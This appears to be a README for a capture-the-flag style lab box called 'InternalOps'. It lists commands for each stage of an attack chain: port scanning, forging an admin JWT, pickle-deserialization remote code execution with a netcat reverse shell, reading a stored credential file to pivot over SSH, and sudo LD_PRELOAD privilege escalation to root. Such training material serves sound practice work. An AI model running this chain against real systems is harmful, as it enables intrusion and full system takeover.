# Attacker Scripts

Standalone tools implementing each stage of the attack chain against the
"InternalOps" box. These are meant to be run from a separate attacker
VM (e.g. Kali) on the same host-only network - never against a target
you don't own/aren't authorized to test.

## 1. Recon
```
nmap -p- -T4 <target-ip>
```
Confirms SSH (22) and the web app on the non-standard port (58421).

## 2. Forge an admin JWT
```
python3 jwt_forge.py --sub operator --role admin
```
Copy the printed token.

## 3. Get a shell via pickle RCE
Start a listener:
```
nc -lvnp 4444
```
Then, in another terminal:
```
python3 pickle_rce.py \
  --url http://<target-ip>:58421/admin/debug \
  --token "<forged jwt from step 2>" \
  --lhost <your-ip> --lport 4444
```
Catch the shell in the `nc` listener. You're now root inside the
container.

## 4. Find the pivot creds
```
cat /opt/app/.internal/host_access.txt
```
SSH to the real host as `user2` with the revealed password.

## 5. Privesc via sudo env_keep LD_PRELOAD
On the host, as `user2`:
```
sudo -l
```
Confirms `env_keep += "LD_PRELOAD"` and the NOPASSWD rule for
`/usr/local/sbin/logcheck`. Then:
```
scp evil.c user2@<target-ip>:/tmp/
ssh user2@<target-ip>
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so /usr/local/sbin/logcheck
```
This drops you into a root shell (`bash -p` preserves the elevated
privileges instead of dropping them).

## 6. Grab the flags
```
cat /home/user2/user.txt
cat /root/root.txt
```
